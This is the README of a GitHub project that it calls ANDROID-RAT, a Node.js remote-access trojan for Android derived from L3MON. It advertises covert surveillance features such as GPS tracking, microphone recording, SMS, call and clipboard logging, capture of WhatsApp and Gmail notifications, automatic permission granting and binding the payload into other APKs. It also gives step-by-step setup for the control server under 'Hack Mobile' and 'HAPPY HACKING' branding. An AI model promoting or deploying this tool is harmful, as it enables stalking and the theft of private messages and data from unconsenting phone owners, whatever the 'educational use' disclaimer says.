<p align="center">
<img src="https://github.com/tulu9777/mo/blob/master/assets/webpublic/logo.png" height="60"><br>
A CLOUD BASED REMOTE ANDROID MANAGMENT SUITE, POWERED BY NODEJS
</p>

<a href="#"><img title="Made in INDIA" src="https://img.shields.io/badge/MADE%20IN%20-INDIA-orange?colorA=%23ff0000&colorB=%23017e40&style=for-the-badge"></a>

<a href="#"><img title="Hack Mobile" src="https://img.shields.io/badge/Hack%20-Mobile%20%F0%9F%98%8E-yellowgreen?style=for-the-badge"></a>


## FEATURES
- GPS Logging
- Microphone Recording
- View Contacts
- SMS Logs
- Send SMS
- Call Logs
- View Installed Apps
- View Stub Permissions
- Live Clipboard Logging
- Live Notification Logging (WhatsApp, Facebook, Instagram, Gmail and more ....)
- View WiFi Networks (logs previously seen)
- File Explorer & Downloader
- Built In APK Builder
- Auto Allow Permission
- Easy Bind Any Apk

## PREREQUISITES
 - Java Runtime Environment 8
    - See [installation](#Installation) for OS specifics
 - NodeJs 
 - A Server

## INSTALLATION ON VPS & PC

1. Install JRE 8 
    - Debian, Ubuntu, Etc
        - `sudo apt-get install openjdk-8-jre`
    - Fedora, Oracle, Red Hat, etc
        -  `su -c "yum install java-1.8.0-openjdk"`
    - Windows 
        - click [HERE](https://www.oracle.com/technetwork/java/javase/downloads/jre8-downloads-2133155.html) for downloads

2. Install NodeJS [Instructions Here](https://nodejs.org/en/download/package-manager/) (If you can't figure this out, you shouldn't really be using this)

3. install PM2 
    - `npm install pm2 -g`

4. Download and Extract [HERE](https://codeload.github.com/Linuxndroid/DroidSpy/zip/master)

5. In the extracted folder, run these commands
    - `npm install` <- install dependencies
    - `pm2 start index.js` <-- start the ANDROID-RAT
    - `pm2 startup` <- to run ANDROID-RAT on startup

6. Default Username & Password check password.txt file
    - Username: ?
    - Password: ?
    
7. Set Username & Password Manually  
    1. Stop ANDROID-RAT `pm2 stop index`
    2. Open `maindb.json` in a text editor
    3. under `admin` 
        - set the `username` as plain text
        - set the `password` as a LOWERCASE MD5 hash
    4. save the file
    5. run `pm2 restart all`

8. in your browser navigate to `http://<SERVER IP>:22533`
    

## HAPPY HACKING
## Disclaimer
<b>JAYADEEP KHETRI Provides no warranty with this software and will not be responsible for any direct or indirect damage caused due to the usage of this tool.<br>
ANDROID-RAT is built for both Educational and Internal use ONLY.</b>

<br>
<p align="center">MADE WITH ❤️ BY <a href="JAYADEEP KHETRI">ANDROID-RAT</a></p>




## CREDITS

<b> Credits to <a href="https://github.com/D3VL">D3VL</a> for the original code base this repository is based on at <a href="https://github.com/D3VL/L3MON">L3MON</a>
